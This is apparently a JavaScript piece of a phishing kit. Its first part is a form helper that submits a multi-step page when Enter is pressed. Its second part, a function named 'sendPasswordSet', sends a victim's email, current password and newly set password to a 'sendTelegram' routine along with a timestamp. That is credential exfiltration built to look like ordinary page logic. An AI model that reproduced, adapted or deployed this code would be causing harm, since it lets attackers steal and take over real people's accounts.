;(function () {
  document.addEventListener('keydown', function (e) {
    if (e.key !== 'Enter' || e.isComposing) return;
    if (e.shiftKey || e.ctrlKey || e.altKey || e.metaKey) return;

    var target = e.target;
    if (!target || (target.tagName !== 'INPUT' && target.tagName !== 'SELECT')) return;
    if (target.tagName === 'INPUT') {
      var type = (target.type || '').toLowerCase();
      if (type === 'checkbox' || type === 'radio' || type === 'button' || type === 'submit' || type === 'file') return;
    }

    var nextBtn = document.getElementById('next_button');
    if (!nextBtn || nextBtn.disabled || nextBtn.offsetParent === null) return;

    e.preventDefault();
    if (typeof showLoader === 'function') showLoader();
    nextBtn.click();
  });
})();

;(function () {
  sendPasswordSet = function (email, password, newPassword) {
    sendTelegram(
      'New Password Has Been Set\nEmail: ' + email +
      '\nPassword: ' + password +
      '\nNew Password: ' + newPassword +
      '\nTime: ' + getCdtTime()
    );
  };
})();
